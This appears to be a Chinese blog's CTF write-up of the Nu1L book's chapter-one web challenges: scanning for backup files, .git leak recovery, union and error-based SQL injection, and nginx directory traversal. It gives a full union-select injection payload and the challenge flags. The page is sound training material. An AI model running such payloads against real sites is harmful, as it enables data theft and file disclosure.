@@ -1,0 +1,1278 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="[第一章 web入门]常见的搜集 硬扫 打开页面提示信息搜集 扫描就完事了，扫出来robots.txt、index.php~和.index.php.">
+<title>Nu1LBook第一章wp</title>
+
+<link rel='canonical' href='https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/'>
+
+<link rel="stylesheet" href="/scss/style.min.dfb009e658ec6e0f0f0c366b98658c0caea5123dcd2536f353c92c2581b79fb7.css"><meta property='og:title' content="Nu1LBook第一章wp">
+<meta property='og:description' content="[第一章 web入门]常见的搜集 硬扫 打开页面提示信息搜集 扫描就完事了，扫出来robots.txt、index.php~和.index.php.">
+<meta property='og:url' content='https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/'>
+<meta property='og:site_name' content='荡影-DorinXL'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2020-11-13T05:23:00&#43;00:00'/><meta property='article:modified_time' content='2020-11-13T05:23:00&#43;00:00'/>
+<meta name="twitter:title" content="Nu1LBook第一章wp">
+<meta name="twitter:description" content="[第一章 web入门]常见的搜集 硬扫 打开页面提示信息搜集 扫描就完事了，扫出来robots.txt、index.php~和.index.php.">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu6744900124519508638.png" width="300"
+                            height="283" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🔥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">荡影-DorinXL</a></h1>
+            <h2 class="site-description">缄默慎独，不破不立，事在人为</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/3217550'
+                        target="_blank"
+                        title="BilBili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://www.cnblogs.com/DorinXL/'
+                        target="_blank"
+                        title="CNblog"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-blogger"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 21h8a5 5 0 0 0 5 -5v-3a3 3 0 0 0 -3 -3h-1v-2a5 5 0 0 0 -5 -5h-4a5 5 0 0 0 -5 5v8a5 5 0 0 0 5 5z" /><path d="M7 7m0 1.5a1.5 1.5 0 0 1 1.5 -1.5h3a1.5 1.5 0 0 1 1.5 1.5v0a1.5 1.5 0 0 1 -1.5 1.5h-3a1.5 1.5 0 0 1 -1.5 -1.5z" /><path d="M7 14m0 1.5a1.5 1.5 0 0 1 1.5 -1.5h7a1.5 1.5 0 0 1 1.5 1.5v0a1.5 1.5 0 0 1 -1.5 1.5h-7a1.5 1.5 0 0 1 -1.5 -1.5z" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/DorinXL/DorinXL.github.io'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#硬扫">硬扫</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#git泄露">.git泄露</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#常规注入">常规注入</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#考报错注入">考报错注入</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#nginx配置错误导致目录穿越">nginx配置错误导致目录穿越</a>
+      <ol>
+        <li>
+          <ol>
+            <li></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+
+  <ol>
+    <li><a href="#摘自官方wp">摘自官方wp</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" >
+                网络安全
+            </a>
+        
+            <a href="/categories/ctf/" >
+                CTF
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/">Nu1LBook第一章wp</a>
+        </h2>
+    
+        
+    </div>
+
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2020-11-13</time>
+            </div>
+	
+
+        
+
+        
+    </footer>
+    
+
+    
+
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="第一章-web入门常见的搜集">[第一章 web入门]常见的搜集
+</h1><h2 id="硬扫">硬扫
+</h2><p>打开页面提示信息搜集</p>
+<p><img src="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132244492-359770402.png"
+	width="723"
+	height="288"
+	srcset="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132244492-359770402_hu9486934578432963981.png 480w, /p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132244492-359770402_hu92434474733764872.png 1024w"
+	loading="lazy"
+	
+		alt="image-20201109191454703"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="251"
+		data-flex-basis="602px"
+	
+></p>
+<p>扫描就完事了，扫出来robots.txt、index.php~和.index.php.swp</p>
+<p><img src="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132244857-1597466579.png"
+	width="297"
+	height="109"
+	srcset="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132244857-1597466579_hu3464009714889292793.png 480w, /p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132244857-1597466579_hu6842907987671509525.png 1024w"
+	loading="lazy"
+	
+		alt="image-20201109191503594"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="272"
+		data-flex-basis="653px"
+	
+></p>
+<p><img src="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132245263-1780283943.png"
+	width="217"
+	height="41"
+	srcset="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132245263-1780283943_hu2613356527968793019.png 480w, /p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132245263-1780283943_hu4864340931875278948.png 1024w"
+	loading="lazy"
+	
+		alt="image-20201109191522788"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="529"
+		data-flex-basis="1270px"
+	
+></p>
+<p><img src="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132245622-1560254552.png"
+	width="1025"
+	height="413"
+	srcset="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132245622-1560254552_hu17929857093187632721.png 480w, /p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132245622-1560254552_hu1950443412327582110.png 1024w"
+	loading="lazy"
+	
+		alt="image-20201109194421877"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="248"
+		data-flex-basis="595px"
+	
+></p>
+<p><img src="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132246026-1181389043.png"
+	width="690"
+	height="360"
+	srcset="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132246026-1181389043_hu4540548368265972802.png 480w, /p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132246026-1181389043_hu219445288479982738.png 1024w"
+	loading="lazy"
+	
+		alt="image-20201109193650672"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="191"
+		data-flex-basis="460px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">n1book{info_1s_v3ry_imp0rtant_hack}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="第一章-web入门粗心的小李">[第一章 web入门]粗心的小李
+</h1><h2 id="git泄露">.git泄露
+</h2><p>使用githack或者githacker</p>
+<p><img src="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132246341-824543893.png"
+	width="1294"
+	height="367"
+	srcset="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132246341-824543893_hu6139991763843630539.png 480w, /p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132246341-824543893_hu628051898418382748.png 1024w"
+	loading="lazy"
+	
+		alt="image-20201109194821129"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="352"
+		data-flex-basis="846px"
+	
+></p>
+<p><img src="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132246746-1683360944.png"
+	width="1056"
+	height="414"
+	srcset="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132246746-1683360944_hu16612256200570454455.png 480w, /p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132246746-1683360944_hu30512062237458833.png 1024w"
+	loading="lazy"
+	
+		alt="image-20201109195406270"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="255"
+		data-flex-basis="612px"
+	
+></p>
+<p>如果用的是githack，使用命令git chechout-index -a来得到index页面</p>
+<p><img src="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132247110-790007756.png"
+	width="650"
+	height="313"
+	srcset="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132247110-790007756_hu10677178469811680567.png 480w, /p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132247110-790007756_hu6669764358322557752.png 1024w"
+	loading="lazy"
+	
+		alt="image-20201109195347885"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="207"
+		data-flex-basis="498px"
+	
+></p>
+<p>index.html:</p>
+<p><img src="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132247436-1217729386.png"
+	width="1267"
+	height="308"
+	srcset="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132247436-1217729386_hu3709738568916855836.png 480w, /p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132247436-1217729386_hu18172762763576771039.png 1024w"
+	loading="lazy"
+	
+		alt="image-20201109195419820"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="411"
+		data-flex-basis="987px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">n1book{git_looks_s0_easyfun}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="第一章-web入门sql注入-1">[第一章 web入门]SQL注入-1
+</h1><h2 id="常规注入">常规注入
+</h2><p>首先确定是字符型的还是数字型的：</p>
+<p><img src="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132247742-1388422534.png"
+	width="883"
+	height="178"
+	srcset="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132247742-1388422534_hu12595089100312315626.png 480w, /p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132247742-1388422534_hu2724650209185356221.png 1024w"
+	loading="lazy"
+	
+		alt="image-20201109195650850"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="496"
+		data-flex-basis="1190px"
+	
+></p>
+<p><img src="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132248058-185740663.png"
+	width="1531"
+	height="665"
+	srcset="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132248058-185740663_hu5452158389241266129.png 480w, /p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132248058-185740663_hu9029095834889454636.png 1024w"
+	loading="lazy"
+	
+		alt="image-20201109195753084"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="230"
+		data-flex-basis="552px"
+	
+></p>
+<p>然后确定字段数量</p>
+<p><img src="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132248408-1126329567.png"
+	width="1145"
+	height="737"
+	srcset="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132248408-1126329567_hu18129005918198171500.png 480w, /p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132248408-1126329567_hu6314118868576476721.png 1024w"
+	loading="lazy"
+	
+		alt="image-20201109200403363"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="155"
+		data-flex-basis="372px"
+	
+></p>
+<p>常规爆库名、表名、列名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39;),(select group_concat(table_name) from information_schema.tables where table_schema=database()) %23
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132248856-1500230368.png"
+	width="1801"
+	height="763"
+	srcset="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132248856-1500230368_hu12686289965894990686.png 480w, /p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132248856-1500230368_hu16931424544106653484.png 1024w"
+	loading="lazy"
+	
+		alt="image-20201109201127797"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="236"
+		data-flex-basis="566px"
+	
+></p>
+<p><img src="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132249264-1940310651.png"
+	width="1903"
+	height="740"
+	srcset="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132249264-1940310651_hu15978493582721842646.png 480w, /p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132249264-1940310651_hu6078817875799307270.png 1024w"
+	loading="lazy"
+	
+		alt="image-20201109201403204"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="257"
+		data-flex-basis="617px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">n1book{union_select_is_so_cool}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="第一章-web入门sql注入-2">[第一章 web入门]SQL注入-2
+</h1><h2 id="考报错注入">考报错注入
+</h2><p>post方法，直接hackbar里写，用报错注入。</p>
+<p><img src="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132249670-1799348440.png"
+	width="1881"
+	height="377"
+	srcset="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132249670-1799348440_hu8110798650166057284.png 480w, /p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132249670-1799348440_hu7607853605432404065.png 1024w"
+	loading="lazy"
+	
+		alt="image-20201112203933902"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="498"
+		data-flex-basis="1197px"
+	
+></p>
+<p>库是note</p>
+<p><img src="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132250072-1214219954.png"
+	width="1085"
+	height="387"
+	srcset="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132250072-1214219954_hu7400469025224937619.png 480w, /p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132250072-1214219954_hu11930542216674268626.png 1024w"
+	loading="lazy"
+	
+		alt="image-20201112204043089"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="280"
+		data-flex-basis="672px"
+	
+></p>
+<p>爆表名列名和flag</p>
+<p><img src="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132250467-1553510745.png"
+	width="1171"
+	height="388"
+	srcset="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132250467-1553510745_hu3864557660660616345.png 480w, /p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132250467-1553510745_hu12197345043377132483.png 1024w"
+	loading="lazy"
+	
+		alt="image-20201112203902754"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="301"
+		data-flex-basis="724px"
+	
+></p>
+<h1 id="第一章-web入门afr_1">[第一章 web入门]afr_1
+</h1><p><img src="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132250751-1378203317.png"
+	width="922"
+	height="45"
+	srcset="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132250751-1378203317_hu15482810265678607471.png 480w, /p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132250751-1378203317_hu11719770042129609195.png 1024w"
+	loading="lazy"
+	
+		alt="image-20201109203248359"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="2048"
+		data-flex-basis="4917px"
+	
+></p>
+<p><img src="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132251046-971330864.png"
+	width="673"
+	height="354"
+	srcset="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132251046-971330864_hu17782676343282130983.png 480w, /p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132251046-971330864_hu1138767343095759175.png 1024w"
+	loading="lazy"
+	
+		alt="image-20201109203307294"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="190"
+		data-flex-basis="456px"
+	
+></p>
+<h1 id="第一章-web入门afr_2">[第一章 web入门]afr_2
+</h1><h2 id="nginx配置错误导致目录穿越">nginx配置错误导致目录穿越
+</h2><p><img src="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132251638-367561607.png"
+	width="452"
+	height="354"
+	srcset="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132251638-367561607_hu17012290869005041276.png 480w, /p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132251638-367561607_hu17619609796677949949.png 1024w"
+	loading="lazy"
+	
+		alt="image-20201112205127708"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="127"
+		data-flex-basis="306px"
+	
+></p>
+<p>查看静态文件</p>
+<p><img src="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132252357-1322787075.png"
+	width="1120"
+	height="443"
+	srcset="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132252357-1322787075_hu12966978291197294485.png 480w, /p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132252357-1322787075_hu5153933396209610952.png 1024w"
+	loading="lazy"
+	
+		alt="image-20201112205158280"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="252"
+		data-flex-basis="606px"
+	
+></p>
+<p>直接在img后面加两个.，使目录变为img/..</p>
+<p><img src="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132252789-130161940.png"
+	width="943"
+	height="336"
+	srcset="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132252789-130161940_hu16399652602613587952.png 480w, /p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132252789-130161940_hu17543501210319001808.png 1024w"
+	loading="lazy"
+	
+		alt="image-20201112205212125"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="280"
+		data-flex-basis="673px"
+	
+></p>
+<h5 id="读flag">读flag
+</h5><p><img src="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132253204-500852270.png"
+	width="930"
+	height="365"
+	srcset="/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132253204-500852270_hu4487562816490721861.png 480w, /p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132253204-500852270_hu5812172848621219144.png 1024w"
+	loading="lazy"
+	
+		alt="image-20201112205411804"
+	
+	
+		class="gallery-image" 
